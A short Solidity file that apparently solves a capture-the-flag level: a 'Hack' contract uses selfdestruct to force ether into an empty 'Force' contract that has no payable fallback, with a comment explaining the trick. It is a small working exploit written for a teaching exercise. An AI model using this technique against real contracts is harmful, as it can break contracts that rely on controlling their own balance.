// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Force {/*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


contract Hack {
  
  constructor() payable {
      
  }
  // even if the primary contract has no fallback, selfdestruct will force to receive the avaiable funds from Hack contract
  function hack(address _hackAddress) public {
    selfdestruct(payable(_hackAddress));
  }
}